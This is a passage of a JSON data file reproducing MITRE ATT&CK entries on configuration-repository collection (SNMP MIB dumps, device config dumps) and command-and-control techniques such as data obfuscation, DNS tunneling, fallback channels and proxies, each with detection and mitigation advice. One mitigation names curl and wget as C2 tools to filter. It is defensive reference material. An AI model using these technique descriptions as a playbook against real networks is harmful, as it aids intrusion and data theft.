Part 2)</a>","detection":"Custom archival methods can be very difficult to detect, since many of them use standard programming language concepts, such as bitwise operations.","platforms":["Linux","macOS","Windows"],"dataSources":["File: File Creation","Script: Script Execution"],"mitigations":[]}]},{"id":"T1602","name":"Data from Configuration Repository","description":"Adversaries may collect data related to managed devices from configuration repositories. Configuration repositories are used by management systems in order to configure, manage, and control data on remote systems. Configuration repositories may also facilitate remote access and administration of devices.\n\nAdversaries may target these repositories in order to collect large quantities of sensitive system administration data. Data from configuration repositories may be exposed by various protocols and software and can store a wide variety of data, much of which may align with adversary Discovery objectives. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>","detection":"Identify network traffic sent or received by untrusted hosts or networks that solicits and obtains the configuration information of the queried device. <a href=\"https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)</a>","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Segregate SNMP traffic on a separate management network. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Apply extended ACLs to block unauthorized protocols outside the trusted network. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Configure SNMPv3 to use the highest level of security (authPriv) available. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1051","name":"Update Software","description":"Keep system images and software updated and migrate to SNMPv3. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>"},{"id":"M1054","name":"Software Configuration","description":"Allowlist MIB objects and implement SNMP views. <a href=\"https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/20370-snmpsecurity-20370.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Securing SNMP)</a>"}],"subTechniques":[{"id":"T1602.001","name":"SNMP (MIB Dump)","description":"Adversaries may target the Management Information Base (MIB) to collect and/or mine valuable information in a network managed using Simple Network Management Protocol (SNMP).\n\nThe MIB is a configuration repository that stores variable information accessible via SNMP in the form of object identifiers (OID). Each OID identifies a variable that can be read or set and permits active management tasks, such as configuration changes, through remote modification of these variables. SNMP can give administrators great insight in their systems, such as, system information, description of hardware, physical location, and software packages <a href=\"https://www.sans.org/reading-room/whitepapers/networkdevs/securing-snmp-net-snmp-snmpv3-1051\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SANS Information Security Reading Room Securing SNMP Securing SNMP)</a>. The MIB may also contain device operational information, including running configuration, routing table, and interface details.\n\nAdversaries may use SNMP queries to collect MIB content directly from SNMP-managed devices in order to collect network information that allows the adversary to build network maps and facilitate future targeted exploitation. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>","detection":"Identify network traffic sent or received by untrusted hosts or networks that expose MIB content or use unauthorized protocols. <a href=\"https://tools.cisco.com/security/center/content/CiscoAppliedMitigationBulletin/cisco-amb-20080610-SNMPv3\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Advisory SNMP v3 Authentication Vulnerabilities)</a>","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Segregate SNMP traffic on a separate management network. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT-TA18-106A)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Apply extended ACLs to block unauthorized protocols outside the trusted network. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Configure SNMPv3 to use the highest level of security (authPriv) available. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1051","name":"Update Software","description":"Keep system images and software updated and migrate to SNMPv3. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>"},{"id":"M1054","name":"Software Configuration","description":"Allowlist MIB objects and implement SNMP views. <a href=\"https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/20370-snmpsecurity-20370.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Securing SNMP)</a>"}]},{"id":"T1602.002","name":"Network Device Configuration Dump","description":"Adversaries may access network configuration files to collect sensitive data about the device and the network. The network configuration is a file containing parameters that determine the operation of the device. The device typically stores an in-memory copy of the configuration while operating, and a separate configuration on non-volatile storage to load after device reset. Adversaries can inspect the configuration files to reveal information about the target network and its layout, the network device and its software, or identifying legitimate accounts and credentials for later use.\n\nAdversaries can use common management tools and protocols, such as Simple Network Management Protocol (SNMP) and Smart Install (SMI), to access network configuration files. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)</a> <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a> These tools may be used to query specific data from a configuration repository or configure the device to export the configuration for later analysis.","detection":"Identify network traffic sent or received by untrusted hosts or networks. Configure signatures to identify strings that may be found in a network device configuration. <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-086A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-068A 2018)</a>","platforms":["Network Devices"],"dataSources":["Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1030","name":"Network Segmentation","description":"Segregate SNMP traffic on a separate management network. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1031","name":"Network Intrusion Prevention","description":"Configure intrusion prevention devices to detect SNMP queries and commands from unauthorized sources. Create signatures to detect Smart Install (SMI) usage from sources other than trusted director. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Apply extended ACLs to block unauthorized protocols outside the trusted network. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1041","name":"Encrypt Sensitive Information","description":"Configure SNMPv3 to use the highest level of security (authPriv) available. <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA17-156A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA17-156A SNMP Abuse 2017)</a>"},{"id":"M1051","name":"Update Software","description":"Keep system images and software updated and migrate to SNMPv3. <a href=\"https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Blog Legacy Device Attacks)</a>"},{"id":"M1054","name":"Software Configuration","description":"Allowlist MIB objects and implement SNMP views. Disable Smart Install (SMI) if not used. <a href=\"https://www.cisco.com/c/en/us/support/docs/ip/simple-network-management-protocol-snmp/20370-snmpsecurity-20370.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco Securing SNMP)</a> <a href=\"https://us-cert.cisa.gov/ncas/alerts/TA18-106A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-106A Network Infrastructure Devices 2018)</a>"}]}]}]},{"tactic":"Command and Control","techniques":[{"id":"T1001","name":"Data Obfuscation","description":"Adversaries may obfuscate command and control traffic to make it more difficult to detect. <a href=\"https://www.bitdefender.com/files/News/CaseStudies/study/379/Bitdefender-Whitepaper-Chinese-APT.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Bitdefender FunnyDream Campaign November 2020)</a> Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level."}],"subTechniques":[{"id":"T1001.001","name":"Junk Data","description":"Adversaries may add junk data to protocols used for command and control to make detection more difficult. <a href=\"https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye SUNBURST Backdoor December 2020)</a> By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level."}]},{"id":"T1001.002","name":"Steganography","description":"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["Linux","macOS","Windows","ESXi"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level."}]},{"id":"T1001.003","name":"Protocol or Service Impersonation","description":"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. \n\nAdversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger. <a href=\"https://www.welivesecurity.com/wp-content/uploads/2019/07/ESET_Okrum_and_Ketrican.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Okrum July 2019)</a> <a href=\"https://unit42.paloaltonetworks.com/cobalt-strike-malleable-c2-profile/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Malleable-C2-U42)</a>","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate some obfuscation activity at the network level."}]}]},{"id":"T1008","name":"Fallback Channels","description":"Adversaries may use fallback or alternate communication channels if the primary channel is compromised or inaccessible in order to maintain reliable command and control and to avoid data transfer thresholds.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"}],"subTechniques":[]},{"id":"T1071","name":"Application Layer Protocol","description":"Adversaries may communicate using OSI application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nAdversaries may utilize many different protocols, including those used for web browsing, transferring files, electronic mail, DNS, or publishing/subscribing. For connections that occur internally within an enclave (such as those between a proxy or pivot node and other nodes), commonly used protocols are SMB, SSH, or RDP. <a href=\"https://www.mandiant.com/resources/blog/unc3524-eye-spy-email\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT29 Eye Spy Email Nov 22)</a>","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["Linux","macOS","Windows","Network Devices","ESXi"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic."}],"subTechniques":[{"id":"T1071.001","name":"Web Protocols","description":"Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as HTTP/S <a href=\"http://cdn0.vox-cdn.com/assets/4589853/crowdstrike-intelligence-report-putter-panda.original.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CrowdStrike Putter Panda)</a> and WebSocket <a href=\"https://securityintelligence.com/posts/brazking-android-malware-upgraded-targeting-brazilian-banks/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Brazking-Websockets)</a> that carry web traffic may be very common in environments. HTTP/S packets have many fields and headers in which data can be concealed. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>\n\nMonitor for web traffic to/from known-bad or suspicious domains.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Restrict and monitor outbound web traffic (HTTP/HTTPS) from critical servers to only approved destinations. Limiting the ability to initiate outbound HTTP/HTTPS connections, especially from public-facing servers, can prevent attackers from using tools like curl or wget to communicate with external C2 servers or download malicious payloads."}]},{"id":"T1071.002","name":"File Transfer Protocols","description":"Adversaries may communicate using application layer protocols associated with transferring files to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMB <a href=\"https://www.us-cert.gov/ncas/alerts/TA18-074A\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: US-CERT TA18-074A)</a>, FTP <a href=\"https://www.welivesecurity.com/wp-content/uploads/2019/08/ESET_Machete.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ESET Machete July 2019)</a>, FTPS, and TFTP that transfer files may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the transferred files. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Filter outbound FTP/SFTP traffic from sensitive systems, allowing file transfers only to trusted internal or known IP addresses. This measure can prevent attackers from transferring data or payloads via FTP/SFTP channels to or from unauthorized external systems."}]},{"id":"T1071.003","name":"Mail Protocols","description":"Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. <a href=\"https://web.archive.org/web/20151022204649/https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-apt28.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye APT28)</a>","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Limit the ability of servers and critical systems to initiate outbound email communications. Filtering SMTP/IMAP/POP3 traffic to only trusted mail servers reduces the risk of attackers using compromised systems to exfiltrate data via email or to receive commands from attacker-controlled email accounts."}]},{"id":"T1071.004","name":"DNS","description":"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic. <a href=\"https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: PAN DNS Tunneling)</a> <a href=\"https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Medium DnsTunneling)</a>\n\nDNS beaconing may be used to send commands to remote systems via DNS queries. A DNS beacon is created by tunneling DNS traffic (i.e. Protocol Tunneling). The commands may be embedded into different DNS records, for example, TXT or A records. <a href=\"https://unit42.paloaltonetworks.com/unit42-oilrig-uses-updated-bondupdater-target-middle-eastern-government/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: OilRig Uses Updated BONDUPDATER to Target Middle Eastern Government)</a> DNS beacons may be difficult to detect because the beacons infrequently communicate with infected devices. <a href=\"https://vercara.digicert.com/resources/dns-beacons#page_top\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: DNS Beacons)</a> Infrequent communication conceals the malicious DNS traffic with normal DNS traffic.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>\n\nMonitor for DNS traffic to/from known-bad or suspicious domains.","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Consider filtering DNS requests to unknown, untrusted, or known bad domains and resources. Resolving DNS requests with on-premise/proxy servers may also disrupt adversary attempts to conceal data within DNS packets."}]},{"id":"T1071.005","name":"Publish/Subscribe Protocols","description":"Adversaries may communicate using publish/subscribe (pub/sub) application layer protocols to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as <code>MQTT</code>, <code>XMPP</code>, <code>AMQP</code>, and <code>STOMP</code> use a publish/subscribe design, with message distribution managed by a centralized broker. <a href=\"https://securityintelligence.com/x-force/wailingcrab-malware-misues-mqtt-messaging-protocol/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wailing crab sub/pub)</a> <a href=\"https://www.mandiant.com/sites/default/files/2021-09/mandiant-apt1-report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Mandiant APT1 Appendix)</a> Publishers categorize their messages by topics, while subscribers receive messages according to their subscribed topics. <a href=\"https://securityintelligence.com/x-force/wailingcrab-malware-misues-mqtt-messaging-protocol/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: wailing crab sub/pub)</a> An adversary may abuse publish/subscribe protocols to communicate with systems under their control from behind a message broker while also mimicking normal, expected traffic.","detection":"","platforms":["macOS","Linux","Windows","Network Devices"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level."},{"id":"M1037","name":"Filter Network Traffic","description":"Consider filtering publish/subscribe protocol requests to untrusted or known bad resources over irregular ports (e.g. MQTT’s standard ports are 1883 or 8883)."}]}]},{"id":"T1090","name":"Proxy","description":"Adversaries may use a connection proxy to direct network traffic between systems or act as an intermediary for network communications to a command and control server to avoid direct connections to their infrastructure. Many tools exist that enable traffic redirection through proxies or port redirection, including HTRAN, ZXProxy, and ZXPortMap. <a href=\"http://blog.trendmicro.com/trendlabs-security-intelligence/in-depth-look-apt-attack-tools-of-the-trade/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro APT Attack Tools)</a> Adversaries use these types of proxies to manage command and control communications, reduce the number of simultaneous outbound network connections, provide resiliency in the face of connection loss, or to ride over existing trusted communications paths between victims to avoid suspicion. Adversaries may chain together multiple proxies to further disguise the source of malicious traffic.\n\nAdversaries can also take advantage of routing schemes in Content Delivery Networks (CDNs) to proxy command and control traffic.","detection":"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server or between clients that should not or often do not communicate with one another). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>\n\nConsider monitoring for traffic to known anonymity networks (such as Tor).","platforms":["ESXi","Linux","macOS","Network Devices","Windows"],"dataSources":["Network Traffic: Network Traffic Flow","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[{"id":"M1020","name":"SSL/TLS Inspection","description":"If it is possible to inspect HTTPS traffic, the captures can be analyzed for connections that appear to be domain fronting."},{"id":"M1031","name":"Network Intrusion Prevention","description":"Network intrusion detection and prevention systems that use network signatures to identify traffic for specific adversary malware can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific C2 protocol used by a particular adversary or tool, and will likely be different across various malware families and versions. Adversaries will likely change tool C2 signatures over time or construct protocols in such a way as to avoid detection by common defensive tools. <a href=\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: University of Birmingham C2)</a>"},{"id":"M1037","name":"Filter Network Traffic","description":"Traffic to known anonymity networks and C2 infrastructure can be blocked through the use of network allow and block lists. It should be noted that this kind of blocking may be circumvented by other techniques like Domain Fronting."}],"subTechniques":[{"id":"T1090.001","name":"Internal Proxy","description":"Adversaries may use an internal proxy to direct command and control traffic between two or more systems in a compromised environment. Many tools exist that enable traffic redirection through proxies or port redirection, including 